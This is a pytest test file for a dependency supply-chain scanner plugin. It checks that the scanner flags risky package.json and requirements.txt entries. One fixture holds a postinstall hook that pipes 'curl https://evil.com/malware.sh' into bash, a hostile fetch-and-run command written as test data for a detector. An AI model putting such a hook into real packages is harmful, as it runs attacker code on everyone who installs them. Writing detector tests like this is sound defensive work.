# tests/plugins/whitebox/test_dep_supply_chain.py
"""Tests for DepSupplyChainPlugin."""
import pytest
from vibee_hacker.plugins.whitebox.dep_supply_chain import DepSupplyChainPlugin
from vibee_hacker.core.models import Target


class TestDepSupplyChain:
    @pytest.fixture
    def plugin(self):
        return DepSupplyChainPlugin()

    @pytest.mark.asyncio
    async def test_postinstall_curl_flagged(self, plugin, tmp_path):
        """postinstall script with curl in package.json is flagged."""
        (tmp_path / "package.json").write_text(
            '{\n'
            '  "name": "my-app",\n'
            '  "scripts": {\n'
            '    "postinstall": "curl https://evil.com/malware.sh | bash"\n'
            '  },\n'
            '  "dependencies": {}\n'
            '}\n'
        )
        target = Target(path=str(tmp_path))
        results = await plugin.run(target)
        assert len(results) >= 1
        assert all(r.rule_id == "dep_supply_chain_risk" for r in results)
        assert all(r.cwe_id == "CWE-506" for r in results)

    @pytest.mark.asyncio
    async def test_clean_package_json_no_findings(self, plugin, tmp_path):
        """Clean package.json with no suspicious scripts produces no results."""
        (tmp_path / "package.json").write_text(
            '{\n'
            '  "name": "my-app",\n'
            '  "scripts": {\n'
            '    "test": "jest",\n'
            '    "build": "webpack"\n'
            '  },\n'
            '  "dependencies": {\n'
            '    "express": "4.18.2"\n'
            '  }\n'
            '}\n'
        )
        target = Target(path=str(tmp_path))
        results = await plugin.run(target)
        assert results == []

    @pytest.mark.asyncio
    async def test_no_dep_files_returns_empty(self, plugin, tmp_path):
        """No dependency files yields empty results."""
        target = Target(path=str(tmp_path))
        results = await plugin.run(target)
        assert results == []

    @pytest.mark.asyncio
    async def test_extra_index_url_flagged(self, plugin, tmp_path):
        """--extra-index-url in requirements.txt is flagged."""
        (tmp_path / "requirements.txt").write_text(
            "--extra-index-url https://my-private-pypi.example.com/simple\n"
            "my-private-package==1.0.0\n"
        )
        target = Target(path=str(tmp_path))
        results = await plugin.run(target)
        assert len(results) >= 1
        assert all(r.rule_id == "dep_supply_chain_risk" for r in results)

    @pytest.mark.asyncio
    async def test_git_url_in_requirements_flagged(self, plugin, tmp_path):
        """git+https:// URL in requirements.txt is flagged."""
        (tmp_path / "requirements.txt").write_text(
            "git+https://github.com/someuser/somerepo.git@main#egg=somepkg\n"
        )
        target = Target(path=str(tmp_path))
        results = await plugin.run(target)
        assert len(results) >= 1

    @pytest.mark.asyncio
    async def test_no_path_returns_empty(self, plugin):
        """Target with no path returns empty."""
        target = Target(url="https://example.com")
        results = await plugin.run(target)
        assert results == []
